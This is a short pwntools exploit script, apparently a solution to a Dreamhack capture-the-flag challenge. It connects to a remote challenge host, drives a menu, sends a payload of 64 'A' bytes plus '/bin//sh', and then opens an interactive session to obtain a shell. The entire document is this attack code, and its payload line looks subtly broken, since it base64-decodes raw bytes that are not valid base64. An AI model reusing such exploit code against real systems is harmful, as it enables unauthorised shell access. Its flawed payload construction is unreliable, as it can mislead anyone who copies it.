from pwn import *
import base64

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 18778
r = remote(HOST, PORT)

payload=base64.b64decode(b'A'*64+b'/bin//sh\x00')
r.sendlineafter(b'> ', b'1')
r.send(payload)
r.sendlineafter(b'> ', b'2')

r.interactive()